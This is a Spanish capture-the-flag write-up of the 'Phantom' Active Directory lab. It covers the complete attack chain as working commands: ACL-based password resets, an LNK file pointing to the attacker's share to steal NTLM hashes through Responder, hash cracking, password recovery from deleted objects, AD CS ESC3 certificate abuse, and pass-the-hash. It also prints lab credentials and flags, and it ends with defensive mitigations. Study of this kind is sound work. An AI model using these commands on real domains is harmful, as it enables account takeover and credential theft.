---
tags: [ctf, thehackerslabs, activedirectory, windows, adcs, esc3, writeup]
plataforma: The Hackers Labs
os: Windows Server 2022
dificultad: AD / media-alta
estado: Resuelto
fecha: 2026-10-16
---

# Phantom — Roadmap / Writeup

> [!success] Resultado
> - **USER flag:** `40c943b496ce2ad56cc7f6f2e86abe00` (escritorio de `robert`)
> - **ADMIN/root flag:** `568e7df15c65b751e1a096a131713925` (escritorio de `Administrador`)

Nota principal: [[Phantom]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| IP objetivo (DC) | `192.168.56.100` |
| Kali (atacante) | `192.168.56.1` (vboxnet0, Host-Only) |
| Dominio | `PHANTOM.THL` (también `PHANTOM.LOCAL` en NetBIOS) |
| Hostname | `DC01` |
| SO | Windows Server 2022 Build 20348 |
| Credenciales de partida | `mark : suP3rPa$sw0rd2026!&` |

> [!tip] /etc/hosts
> ```
> 192.168.56.100 dc01.phantom.thl phantom.thl DC01
> ```

---

## 1. Problema previo: la VM no conectaba

La VM arrancaba con IP APIPA `169.254.124.106` en vez de su IP fija.
**Causa:** el servidor DHCP de VirtualBox usaba la misma IP `192.168.56.100` que la IP fija de la VM → conflicto → Windows desactivaba la IP.
**Solución:** mover el DHCP de VirtualBox a otra IP.
```bash
VBoxManage dhcpserver modify --network=HostInterfaceNetworking-vboxnet0 \
  --server-ip=192.168.56.2 --lower-ip=192.168.56.101 --upper-ip=192.168.56.254 \
  --netmask=255.255.255.0 --enable
VBoxManage dhcpserver restart --network=HostInterfaceNetworking-vboxnet0
```

---

## 2. Reconocimiento

```bash
nmap -Pn -sCV -p- 192.168.56.100
```
Puertos clave: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268/3269, 5985 (WinRM), 9389 (ADWS) → **Controlador de Dominio de Active Directory**.

Identificación rápida del SO/dominio:
```bash
nmap -Pn -p445 --script smb-os-discovery 192.168.56.100
netexec smb 192.168.56.100 -u '' -p ''        # Null Auth: True
```

> [!note] Enumeración anónima
> Null session conecta pero **no** deja listar shares ni RID-brute. LDAP anónimo solo lee el RootDSE. Se necesitan credenciales → las da el enunciado (`mark`).

---

## 3. Fase 1 — Pivoting por ACLs (mark → bob → frank)

### 3.1 Validar credenciales
```bash
netexec smb   192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&'
netexec ldap  192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&' --users
netexec smb   192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&' --shares
```
- mark ∈ grupo **Support**.
- Share no estándar **`Dev Tools`** con permisos **READ,WRITE**.

### 3.2 BloodHound
```bash
bloodhound-python -u mark -p 'suP3rPa$sw0rd2026!&' -d PHANTOM.THL \
  -dc dc01.phantom.thl -ns 192.168.56.100 -c All --zip
```

**Ruta de ataque encontrada:**
```
mark ──GenericAll──► bob
bob  (∈ IT, HELPDESK)
IT   ──WriteDacl──► HELPDESK
HELPDESK ──ForceChangePassword──► frank
frank ∈ "Usuarios de administración remota" (WinRM)
```

### 3.3 Abuso de la cadena
```bash
# mark: GenericAll sobre bob -> cambiar su contraseña (ojo a la política de complejidad)
net rpc password bob 'P3rr0Verde$2026!xYz' -U 'PHANTOM.THL/mark%suP3rPa$sw0rd2026!&' -S 192.168.56.100

# bob (HELPDESK): ForceChangePassword sobre frank
net rpc password frank 'Fr@nkN3w$2026!xYz' -U 'PHANTOM.THL/bob%P3rr0Verde$2026!xYz' -S 192.168.56.100

# frank -> WinRM
netexec winrm 192.168.56.100 -u frank -p 'Fr@nkN3w$2026!xYz'   # (Pwn3d!)
evil-winrm -i 192.168.56.100 -u frank -p 'Fr@nkN3w$2026!xYz'
```

> [!warning] Conceptos
> - **GenericAll / WriteDACL / ForceChangePassword**: permisos sobre objetos de AD que permiten tomar control de usuarios/grupos.
> - La política de contraseñas rechaza passwords débiles → usar una larga y compleja.

---

## 4. Fase 2 — frank → robert (NTLM theft + crackeo) = USER FLAG

frank **no** tiene privilegios locales ni es admin. Pero el share **Dev Tools** es escribible y hay una tarea programada (robert) que lo "visita".

### 4.1 LNK malicioso + Responder (LLMNR/NTLM theft)
```bash
# Crear .lnk con icono apuntando a UNC del atacante (pylnk3)
python3 -c "import pylnk3; l=pylnk3.create('config.lnk'); l.icon=r'\\\\192.168.56.1\\share\\x.ico'; l.work_dir=r'\\\\192.168.56.1\\share'; l.save()"

# Responder a la escucha (necesita root)
sudo responder -I vboxnet0 -wv

# Subir el LNK al share escribible
smbclient "//192.168.56.100/Dev Tools" -U 'PHANTOM.THL/frank%Fr@nkN3w$2026!xYz' -c 'put config.lnk config.lnk'
```
Al visualizarse el share, la sesión de robert carga el icono desde el UNC → **NTLMv2 capturado**:
```
[SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
[SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL:...
```

### 4.2 Crackeo
```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt robert.hash
# robert : bLink182
```

### 4.3 USER FLAG
```bash
evil-winrm -i 192.168.56.100 -u robert -p 'bLink182'
# type C:\Users\robert\Desktop\user.txt  -> 40c943b496ce2ad56cc7f6f2e86abe00
```
Pista extra: `C:\Users\robert\Documents\migration_notes.txt` → menciona **cuentas de prueba temporales** y **certificados internos**.

---

## 5. Fase 3 — robert → tomas (tombstones + reutilización)

### 5.1 Objetos eliminados (tombstones)
robert ∈ **DevOps**. Las notas apuntan a cuentas de prueba borradas. Buscar en el contenedor *Deleted Objects* con el control LDAP *show-deleted* (`1.2.840.113556.1.4.417`):

```python
from ldap3 import Server, Connection, ALL, SUBTREE
c = Connection(Server('192.168.56.100', get_info=ALL),
               user='PHANTOM\\robert', password='bLink182',
               authentication='NTLM', auto_bind=True)
c.search('DC=PHANTOM,DC=THL', '(isDeleted=TRUE)', search_scope=SUBTREE,
         attributes=['sAMAccountName','description','isDeleted'],
         controls=[('1.2.840.113556.1.4.417', True, None)])
print(c.entries)
```
Resultado:
```
CN=dev_test\0ADEL:...,CN=Deleted Objects,DC=PHANTOM,DC=THL
  sAMAccountName = dev_test
  description    = f6Y%UPa6ZB9eR5wG9$an      <-- contraseña
```

### 5.2 Reutilización de credenciales → tomas
```bash
netexec smb 192.168.56.100 -u users.txt -p 'f6Y%UPa6ZB9eR5wG9$an' --continue-on-success
# [+] PHANTOM.THL\tomas:f6Y%UPa6ZB9eR5wG9$an
```

---

## 6. Fase 4 — tomas → Administrador (ADCS ESC3) = ADMIN FLAG

### 6.1 Detectar ESC3
```bash
certipy-ad find -u tomas@phantom.thl -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 -vulnerable -stdout
```
```
Template Name : Phantom-DevAuth
Extended Key Usage : Certificate Request Agent
Enrollment Rights  : PHANTOM.THL\Tomas
[!] ESC3 : Template has Certificate Request Agent EKU set.
```

### 6.2 Explotar ESC3 (Enrollment Agent on-behalf-of)
```bash
# Paso 1: certificado de "agente de inscripción"
certipy-ad req -u tomas@phantom.thl -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 \
  -ca PHANTOM-DC01-CA -template Phantom-DevAuth
# -> tomas.pfx

# Paso 2: pedir cert EN NOMBRE DE Administrador usando una plantilla de client-auth (User)
certipy-ad req -u tomas@phantom.thl -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 \
  -ca PHANTOM-DC01-CA -template User \
  -on-behalf-of 'PHANTOM\Administrador' -pfx tomas.pfx -out administrador
# -> administrador.pfx
```

### 6.3 PKINIT → hash NT del Administrador
```bash
certipy-ad auth -pfx administrador.pfx -dc-ip 192.168.56.100
# Got TGT
# Got hash for 'administrador@phantom.thl':
#   aad3b435b51404eeaad3b435b51404ee:dda94fc1fe08ac45c2cc490404651162
```

### 6.4 Pass-the-Hash → ADMIN FLAG
```bash
netexec winrm 192.168.56.100 -u Administrador -H dda94fc1fe08ac45c2cc490404651162   # (Pwn3d!)
evil-winrm -i 192.168.56.100 -u Administrador -H dda94fc1fe08ac45c2cc490404651162
# type C:\Users\Administrador\Desktop\root.txt -> 568e7df15c65b751e1a096a131713925
```

---

## 7. Resumen de la kill chain

```
mark (dado)
  └─GenericAll→ bob ─(HELPDESK: ForceChangePassword)→ frank (WinRM)
        └─ share Dev Tools escribible + LNK + Responder → hash de robert
              └─ crack rockyou → robert (bLink182) ───────────── USER FLAG
                    └─ tombstone dev_test (description) → password
                          └─ reutilización → tomas
                                └─ ADCS ESC3 (Phantom-DevAuth) → cert Administrador
                                      └─ PKINIT → NT hash → PtH ─── ADMIN FLAG
```

---

## 8. Técnicas para estudiar (checklist)

- [ ] Permisos AD: **GenericAll / WriteOwner / WriteDACL / ForceChangePassword / AddSelf** → [[AD - Abuso de ACLs]]
- [ ] **BloodHound** (recolección con bloodhound-python y lectura de edges)
- [ ] **NTLM theft** vía LNK/SCF/URL en shares escribibles + **Responder** → [[Responder - NTLM theft]]
- [ ] Crackeo **NetNTLMv2** con john/hashcat (`-m 5600`)
- [ ] **Tombstones / Deleted Objects** (control LDAP show-deleted) → [[AD - Objetos eliminados]]
- [ ] Credenciales en atributo **description** y **reutilización / password spraying**
- [ ] **AD CS ESC3** (Certificate Request Agent / Enrollment Agent on-behalf-of) → [[ADCS - ESC Guide]]
- [ ] **PKINIT** + **Pass-the-Hash** con certipy

## 9. Mitigaciones (lado defensa)

- Revisar y minimizar ACLs delegadas (nada de GenericAll/ForceChangePassword innecesarios).
- Deshabilitar **LLMNR/NBT-NS** y exigir **SMB signing**.
- No dejar shares escribibles por todos; monitorizar escritura de `.lnk/.scf`.
- Purgar cuentas de prueba y **no** guardar secretos en `description`; vaciar la papelera de AD.
- Endurecer plantillas de certificados (quitar EKU *Certificate Request Agent*, restringir *enroll*).
- Rotar el hash de `krbtgt` y de cuentas comprometidas.
